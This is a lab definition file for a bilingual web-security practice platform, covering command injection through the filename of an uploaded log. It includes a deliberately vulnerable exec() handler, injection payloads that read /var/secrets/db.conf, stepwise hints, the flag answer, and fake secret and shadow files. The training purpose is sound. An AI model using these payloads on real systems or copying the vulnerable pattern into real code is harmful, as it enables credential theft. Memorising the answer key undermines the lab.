// src/modules/practice-labs/command-injection/labs/lab3/lab3.metadata.ts
import type { LabMetadata } from '../../../types/lab-metadata.type';

export const cmdLab3Metadata: LabMetadata = {
  slug: 'cmdi-filename-log-analyzer-upload',
  title: 'Command Injection: Malicious Filename — Log Analyzer Upload',
  ar_title: 'حقن الأوامر: اسم ملف خبيث — رافع محلل السجلات',
  description:
    'Exploit a command injection vulnerability where the attack vector is the filename of an uploaded log file. The server passes the filename directly into a shell command for processing. Craft a malicious filename containing shell metacharacters to execute arbitrary commands.',
  ar_description:
    'استغل ثغرة حقن أوامر حيث يكون متجه الهجوم هو اسم الملف المرفوع. الخادم يمرر اسم الملف مباشرة في أمر shell للمعالجة. أنشئ اسم ملف خبيث يحتوي على shell metacharacters لتنفيذ أوامر عشوائية.',
  difficulty: 'INTERMEDIATE',
  category: 'WEB_SECURITY',
  skills: [
    'Command Injection',
    'File Upload Security',
    'Filename Sanitization',
    'Shell Metacharacter Injection',
  ],
  xpReward: 260,
  pointsReward: 130,
  duration: 45,
  executionMode: 'SHARED_BACKEND',
  isPublished: true,
  goal: 'Upload a log file with a malicious filename like "access$(cat /var/secrets/db.conf).log". The server processes the filename in a shell command — extract the database credentials hidden in /var/secrets/db.conf.',
  scenario: {
    context:
      'LogVault is a centralized log analysis platform. When a log file is uploaded, the backend processes it with: exec("grep ERROR /uploads/" + filename + " | wc -l"). The filename is taken directly from the request without sanitization. An attacker can craft a filename with $() subshell substitution or backticks to inject commands that execute during filename processing.',
    vulnerableCode: `// Log processor (vulnerable):
app.post('/logs/upload', isAuthenticated, async (req, res) => {
  const filename = req.body.filename; // User-controlled!
  // ❌ Filename goes directly into shell command
  const result = await exec(\`grep ERROR /uploads/\${filename} | wc -l\`);
  res.json({ errorCount: result.stdout.trim() });
});`,
    exploitation:
      'Filename: "access$(whoami).log" → executes whoami inside $().\nOr: "access`cat /var/secrets/db.conf`.log" → reads secrets.\nOr: "access.log; cat /var/secrets/db.conf" for simpler injection.',
  },
  hints: [
    {
      order: 1,
      xpCost: 15,
      content:
        'Try a normal filename first: "access.log". Works fine. Now try "access$(whoami).log" — the $() is a subshell substitution executed by bash.',
    },
    {
      order: 2,
      xpCost: 30,
      content:
        'Shell subshell: $(command) executes command and substitutes its output into the string. So "file$(whoami).log" becomes "filewww-data.log" after execution.',
    },
    {
      order: 3,
      xpCost: 55,
      content:
        'POST /logs/upload with { "filename": "access.log; cat /var/secrets/db.conf" }. The semicolon separates commands — the second command reads the secrets file.',
    },
    {
      order: 4,
      xpCost: 75,
      content:
        'Try filename: "access$(cat /var/secrets/db.conf).log" to use subshell injection, OR "access.log; cat /var/secrets/db.conf" for direct injection.',
    },
  ],
  flagAnswer: 'FLAG{CMDI_FILENAME_INJECTION_LOG_UPLOAD_SECRETS}',
  initialState: {
    contents: [
      {
        title: 'DB_CONF',
        body: JSON.stringify({
          path: '/var/secrets/db.conf',
          content:
            '# Production Database Config\nDB_HOST=prod-db-01.internal\nDB_USER=logvault_admin\nDB_PASS=Pr0d_DB_S3cr3t_2024!\nDB_NAME=logvault_prod\nFLAG=FLAG{CMDI_FILENAME_INJECTION_LOG_UPLOAD_SECRETS}',
        }),
        author: 'system_file',
        isPublic: false,
      },
      {
        title: 'SHADOW',
        body: JSON.stringify({
          path: '/etc/shadow',
          content:
            'root:$6$xyz$hashedpassword:19000:0:99999:7:::\nlogvault:$6$abc$anotherhash:19000:0:99999:7:::',
        }),
        author: 'system_file',
        isPublic: false,
      },
    ],
  },
};
